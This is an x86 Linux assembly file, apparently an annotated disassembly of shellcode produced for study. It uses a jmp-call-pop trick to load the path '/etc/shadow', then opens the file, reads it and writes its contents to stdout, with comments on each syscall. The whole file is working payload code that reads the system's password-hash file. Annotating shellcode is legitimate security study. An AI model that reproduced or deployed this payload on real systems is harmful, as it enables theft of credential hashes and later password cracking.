; Name; FILENAME
; Author hodorsec

global _start
section .text

_start:

; A jump, but ndisasm doesn't compute. We could use jumps or pushing the string on stack
jmp short 0x38

; sys_open
; int open(const char *pathname, int flags);
mov eax,0x5			; Syscall for open
pop ebx				; Pathname for file to be read, popped from stack into EBX
xor ecx,ecx			; Empty register for no flags
int 0x80			; Syscall

mov ebx,eax			; FD Pointer result from previous syscall in EBX, for usage by read syscall

; sys_read
; ssize_t read(int fd, void *buf, size_t count);
mov eax,0x3			; Syscall for read
mov edi,esp			; Save stackpointer address in EDI
mov ecx,edi			; Copy stackpointer address in ECX, for buffer parameter for write call
mov edx,0x1000			; Use 0x1000 for the count parameter for read call
int 0x80			; Syscall

mov edx,eax			; Copy resulting FD from read into EDX for write syscall, count parameter

; sys_write
; ssize_t write(int fd, const void *buf, size_t count);
mov eax,0x4			; Syscall for write
mov ebx,0x1			; 1 for STDOUT, File Descriptor FD
int 0x80			; Syscall

; sys_exit
; void exit(int status);
mov eax,0x1			; 1 for exit
mov ebx,0x0			; Status code zero
int 0x80			; Syscall

call dword 0x2
; BEGIN STRING '/etc/shadow'
das
gs jz 0xa4
das
jnc 0xac
popad
fs outsd
ja 0x49
; END STRING

